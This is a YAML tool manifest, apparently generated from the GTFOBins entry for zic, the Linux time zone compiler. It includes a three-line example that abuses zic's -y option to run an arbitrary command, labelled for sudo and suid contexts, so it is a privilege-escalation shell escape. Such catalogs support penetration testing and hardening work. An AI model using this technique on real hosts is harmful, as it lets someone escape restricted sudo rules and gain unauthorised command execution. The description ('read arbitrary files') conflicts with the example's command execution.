---
id: system-timezone-zic
namespace: system:timezone:zic
name: zic
description: Time zone compiler; can read arbitrary files.
author: GTFOBins
version: 1.0.0
capabilities:
- security.execution.command
platforms:
- linux
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
- amd64
- arm64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - shell-access
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: none
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: none
  disk_io: low
allowed-tools:
- zic
parameters: []
features:
- file-system
- local
- pipes-stdin
execution:
  template: zic
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Execute arbitrary commands (sudo, suid, unprivileged)
  command: 'echo ''Rule Jordan 0 1 xxx Jan lastSun 2 1:00d -'' >/path/to/temp-file

    echo ''Zone Test 2:00 Jordan CE%sT'' >>/path/to/temp-file

    zic -d . -y /path/to/command /path/to/temp-file'
references:
- label: GTFOBins
  url: https://gtfobins.github.io/gtfobins/zic/
techniques:
- execution
install:
- method: apt
  package_name: tzdata
  commands:
  - apt-get install -y tzdata
---

# zic

zic is a command-line utility. Time zone compiler; can also execute arbitrary commands.
